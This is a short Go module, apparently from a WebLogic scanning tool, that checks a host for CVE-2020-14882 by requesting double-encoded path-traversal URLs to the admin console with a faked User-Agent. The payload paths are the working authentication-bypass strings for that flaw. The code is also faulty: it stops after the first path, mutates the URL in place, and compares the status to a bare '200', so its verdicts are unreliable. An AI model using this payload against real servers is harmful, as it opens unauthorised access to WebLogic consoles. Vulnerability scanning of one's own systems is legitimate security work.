package cve_2020_14882

import (
	"WeblogicScan/config"
	"fmt"
	"github.com/fatih/color"
)

func cve_2020_14882(url string) {
	paths := []string{"/console/css/%252e%252e%252fconsole.portal", "/css/%252e%252e%252fconsole.portal"}
	for _, path := range paths {
		url = url + path
		resp, err := config.Client.R().
			SetHeader("User-Agent", config.Fakeua()).
			Get(url)
		if err != nil { // Error handling.
			fmt.Printf("[-] Target weblogic not detected CVE-2020-14882\n")
			return
		}
		if resp.Status == "200" {
			color.Red("*Found cve-2020-14882！")
			return
		} else {
			fmt.Printf("[-] Target weblogic not detected CVE-2020-14882\n")
		}
		return
	}
}
func Run(u string, port string) {
	url := "http://" + u + ":" + port
	cve_2020_14882(url)
}
